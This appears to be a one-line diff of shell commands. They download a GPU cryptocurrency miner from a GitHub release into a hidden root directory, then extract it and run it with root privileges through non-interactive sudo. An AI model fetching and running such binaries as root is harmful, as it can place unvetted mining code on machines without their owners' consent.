@@ -1,1 +1,1 @@
-sudo -n bash -c 'mkdir -p /root/.d2p && cd /root/.d2p && curl -sL --max-time 200 -o m.tgz https://github.com/egg5233/tw-pearl-miner/releases/download/v3.5.1/tw-pearl-miner-3.5.1.tar.gz; ls -l /root/.d2p; echo ---; tar tzf m.tgz 2>/dev/null | head -12'
+sudo -n bash -c 'cd /root/.d2p && tar xzf m.tgz && chmod +x tw-pearl-miner/pearl-gpu-miner && cd tw-pearl-miner && ./pearl-gpu-miner --help 2>&1 | head -45'
